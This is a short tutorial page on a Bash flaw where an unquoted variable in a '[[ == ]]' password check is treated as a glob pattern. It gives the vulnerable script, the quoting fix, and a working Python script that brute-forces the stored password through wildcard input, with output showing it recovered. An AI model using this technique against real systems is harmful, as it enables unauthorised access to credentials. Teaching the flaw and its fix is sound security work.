---
title: "Bash"
summary: "Practical examples of Bash script vulnerabilities and exploitation techniques."
---

## Variable Comparison Vulnerability

```
#!/bin/bash
DB_USER="root"
DB_PASS="$(/usr/bin/cat /home/root/cred.txt)"

read -s -p "Enter password for $DB_USER: " USER_PASS
echo

if [[ $DB_PASS == $USER_PASS ]]; then
        echo "Password confirmed!"
else
        echo "Password confirmation failed!"
fi
```

The problem here is in how the variables are compared.

If you use `$var` directly, it can cause unexpected results, especially if the variable contains **spaces** or **special characters**.

The **safer way** is to quote your variables like this: `"${var}"`.

This **ensures the comparison** works correctly and avoids potential security issues.

### Exploit Vulnerability

This vulnerability allows us to **discover the password** through **brute force**.

In this case, ***cred.txt*** contains the password **k4l1L1nUx**.

The program will interpret `[[ $DB_PASS == k4l1L1nUx ]]` the same as `[[ $DB_PASS == k* ]]`.

So through testing, we would **discover the password**. To automate it, we will use a Python script.

```
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
file = str(input("File name: "))
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | ./{file}"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            # Remove the comment if you want me to show you the process of how it is finding the password.
            # print(password) 
            break
    else:
        found = True
        print("The password is: ", password)
```

Result when running the script:

```
kali@kali:~$ python3 script.py 
File name: bash_vuln
k
k4
k4l
k4l1
k4l1L
k4l1L1
k4l1L1n
k4l1L1nU
k4l1L1nUx
The password is:  k4l1L1nUx
```